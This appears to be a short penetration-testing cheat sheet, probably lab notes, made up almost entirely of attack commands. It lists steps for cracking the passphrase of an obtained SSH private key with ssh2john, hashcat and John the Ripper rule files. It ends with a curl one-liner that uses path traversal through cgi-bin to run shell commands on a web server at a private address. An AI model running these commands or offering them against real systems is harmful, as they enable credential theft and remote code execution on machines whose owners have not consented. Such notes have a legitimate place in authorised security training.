Obtain private key (id_rsa)

```
chmod 600 id_rsa
```

Convert to hash:
```
ssh2john id_rsa > ssh.hash
```

Crack hash using rule file ssh.rule
```
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

If that doesn't work use JtR with the rule file located at /etc/john/john.conf
```
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

```
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; whoami" "192.168.221.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```
